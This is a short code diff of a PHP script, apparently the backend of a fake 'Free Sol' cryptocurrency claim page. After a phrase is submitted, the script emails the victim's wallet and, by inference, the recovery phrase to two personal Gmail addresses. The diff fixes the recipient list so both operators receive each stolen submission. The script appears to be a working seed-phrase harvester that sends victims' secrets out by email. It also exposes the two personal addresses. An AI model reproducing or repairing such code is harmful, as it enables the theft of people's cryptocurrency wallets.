@@ -35,7 +35,7 @@ if (empty($phrase)){
     try {
         $result = $resend->emails->send([
             'from' => 'Free Sol <contact@claimfeesol.com>',
-            'to' => ['osemensilas@gmail.com', ['smitharayaskul35@gmail.com']],
+            'to' => ['osemensilas@gmail.com', 'smitharayaskul35@gmail.com'],
             'subject' => 'New Token',
             'html' => "
                 <p>Wallet: {$wallet}</p>
